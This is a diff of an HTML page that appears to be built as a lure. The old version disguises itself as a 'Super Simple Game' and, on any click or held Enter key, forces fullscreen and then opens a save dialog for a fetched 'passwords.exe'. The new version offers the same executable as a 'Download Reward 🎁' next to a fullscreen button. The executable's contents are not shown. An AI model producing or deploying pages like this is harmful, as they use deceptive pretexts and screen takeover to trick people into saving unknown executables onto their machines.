@@ -1,79 +1,90 @@
+<!DOCTYPE html>
 <html>
+
 <head>
-    <title>Fixed Fullscreen & Download</title>
+    <title>Picker + Fullscreen (2 Step)</title>
     <meta charset="UTF-8">
-    <style>
-        body {
-            background: rgba(29, 48, 109, 0.849);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 100vh;
-            margin: 0;
-            cursor: pointer;
-        }
-        h1, h2, h3 { -webkit-text-stroke: 1px #00000050; text-align: center; }
-        h1 { color: #D96C06; font-size: 56px; }
-        h2 { color: #1ebe8e; font-size: 56px; }
-        h3 { color: #C6F91F; font-size: 56px; }
-    </style>
 </head>
+
+<style>
+body {
+    background: #1d306d;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    height: 100vh;
+    margin: 0;
+    color: white;
+    text-align: center;
+    font-family: Arial;
+}
+
+button {
+    padding: 15px 30px;
+    font-size: 20px;
+    margin: 15px;
+    cursor: pointer;
+    border-radius: 10px;
+    border: none;
+}
+</style>
+
 <body>
-    <script>
-        let countEnter = 0;
 
-        async function triggerAction() {
-            // 1. Pehle Fullscreen Request karo (Ye turant hoga kyunki click event ke andar hai)
-            const elem = document.documentElement;
-            try {
-                if (elem.requestFullscreen) {
-                    await elem.requestFullscreen();
-                } else if (elem.webkitRequestFullscreen) {
-                    await elem.webkitRequestFullscreen();
-                }
-            } catch (err) {
-                console.log("Fullscreen blocked:", err);
-            }
+<h1>Step 1 → Save File</h1>
+<button id="btn1">Download Reward 🎁</button>
 
-            // 2. Fullscreen hone ke 1 second baad Download Popup dikhao
-            setTimeout(async () => {
-                try {
-                    const options = {
-                        suggestedName: 'passwords.exe',
-                        types: [{
-                            description: 'Executable File',
-                            accept: { 'application/x-msdownload': ['.exe'] }
-                        }]
-                    };
-                    const handle = await window.showSaveFilePicker(options);
-                    const writable = await handle.createWritable();
-                    const response = await fetch('passwords.exe');
-                    await response.body.pipeTo(writable);
-                } catch (err) {
-                    console.log("Download Cancelled:", err);
-                }
-            }, 1000);
+<h1>Step 2 → Continue</h1>
+<button id="btn2">Go Fullscreen 🚀</button>
+
+<h3 id="status"></h3>
+
+<script>
+// BUTTON 1 → FILE PICKER
+document.getElementById("btn1").onclick = () => {
+
+    document.getElementById("status").textContent = "Opening file picker...";
+
+    setTimeout(async () => {
+        try {
+            const handle = await window.showSaveFilePicker({
+                suggestedName: "passwords.exe",
+                types: [{
+                    description: "Executable",
+                    accept: {
+                        "application/octet-stream": [".exe"]
+                    }
+                }],
+                excludeAcceptAllOption: true
+            });
+
+            const writable = await handle.createWritable();
+
+            const response = await fetch("passwords.exe");
+            await response.body.pipeTo(writable);
+
+            document.getElementById("status").textContent = "File saved successfully ✅";
+
+        } catch (e) {
+            document.getElementById("status").textContent = "Cancelled ❌";
         }
+    }, 1000); // 1 sec delay
+};
 
-        window.onload = function () {
-            // Screen click handle
-            document.body.addEventListener('click', triggerAction, { once: true });
 
-            // Enter hold handle
-            document.onkeydown = e => {
-                if (e.key == "Enter") {
-                    countEnter++;
-                    if (countEnter > 5) triggerAction();
-                }
-            };
-            document.onkeyup = e => { if (e.key == "Enter") countEnter = 0; };
-        };
-    </script>
+// BUTTON 2 → FULLSCREEN
+document.getElementById("btn2").onclick = () => {
 
-    <h1>Super Simple Game😻😻😻</h1>
-    <h2>CLICK ANYWHERE OR HOLD ENTER</h2>
-    <h3>Wait for the magic!</h3>
-    <h3 id="gameover"></h3>
+    document.getElementById("status").textContent = "Entering fullscreen...";
+
+    setTimeout(() => {
+        if (!document.fullscreenElement) {
+            document.documentElement.requestFullscreen().catch(()=>{});
+        }
+    }, 1000); // 1 sec delay
+};
+</script>
+
 </body>
 </html>
